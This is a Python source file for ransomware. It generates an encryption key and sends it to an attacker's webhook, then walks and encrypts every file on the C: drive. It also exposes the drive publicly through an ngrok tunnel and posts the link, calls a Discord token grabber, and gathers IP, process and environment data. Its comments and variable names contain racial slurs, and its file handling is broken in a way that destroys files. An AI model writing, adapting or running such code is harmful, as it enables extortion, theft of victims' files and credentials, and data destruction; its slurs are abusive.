import os, http.server, socketserver, requests, threading, grabber
from ctypes import windll
from pyngrok import ngrok
from cryptography.fernet import Fernet
from ctypes import windll
from typing import Optional
from vars import HOOK as WEBHOOK_URL
from machine_info import Info

key = Fernet.generate_key() #so they cant get the key
try: #get the key
    requests.post(
        WEBHOOK_URL,
        json={'content': f"@everyone\nencryption key --> {key}"}
    )
except Exception as ex:
    requests.post(
        WEBHOOK_URL,
        json={"content": f"@everyone\nException: --> {ex}"}
    )

def message_box(content: str, title: str, _: Optional[int] = 0) -> None:
    windll.user32.MessageBox(0, content, title, _)

class Server: #serve C drive #0x00 W
    def __init__(self, webhook: str):
        self.port = 80
        self.http_tunnel = ngrok.connect()
        self.handler = http.server.SimpleHTTPRequestHandler
        self.httpd = socketserver.TCPServer(("localhost", self.port), self.handler)
        requests.post(
            url=webhook,
            json={"content": f"@everyone\nThis niggas c drive: --> {self.http_tunnel}"}
        )
    
    def serve_c_drive(self) -> None:
        os.chdir("C:\\")
        self.httpd.serve_forever()

class Grabber: #grab every file
    @staticmethod
    def grab_all() -> list:
        file_paths = []
        for root, _, files in os.walk('C:\\'):
            for file in files:
                _, _ = os.path.splitext(root + "\\" + file)
                file_paths.append(root + "\\" + file)
        return file_paths


class Encryptor: #encryption
    def __init__(self) -> None:
        self.fernet: Fernet = Fernet(key)
    
    def encrypt_file(self, file: str) -> None:
        if __file__ in file:
            return
        with open(file, "wb+") as file:
            file.write(self.fernet.encrypt(file.read()))

    def decrypt_file(self, file: str) -> None:
        with open(file, "wb+") as file:
            file.write(self.fernet.decrypt(file.read()))



class RansomWare:
    def __init__(self, grabber: object, file_serve: object, encryptor: object):
        self.encryptor: Encryptor = encryptor
        self.files = grabber.grab_all()
        file_serve.serve_c_drive()
    
    def encrypt_all(self): #attempt to encrypt every file
        for file in self.files:
            try:
                _t = threading.Thread(target=self.encryptor.encrypt_file, args=(file,))
                _t.daemon = True
                _t.start()
            except: #no permission :(
                pass
    
    def decrypt_all(self): #if u feelin nice
        for file in self.files:
            try:
                _t = threading.Thread(target=self.encryptor.decrypt_file, args=(file,))
                _t.daemon = True
                _t.start()
            except: #no permission :(
                pass
    
    def discord_grabber(self) -> None: #xylo's shii
        grabber.init_grabber()
            
    def get_all_info(self):
        info_getter = Info()
        ip_info = info_getter.pull_ip_info()
        processes = info_getter.get_runing_processes()
        current_time = info_getter.get_time()
        env_vars = info_getter.get_enviornment_vars()
        env_path = info_getter.get_enviornment_path()
        return ip_info, processes, current_time, env_vars, env_path 
        
def init_ransomware() -> None:
    server = Server(WEBHOOK_URL) 
    grabber = Grabber()
    encryptor = Encryptor()
    ima_kill_you_nigga = RansomWare(grabber, server, encryptor)
    ima_kill_you_nigga.encrypt_all()
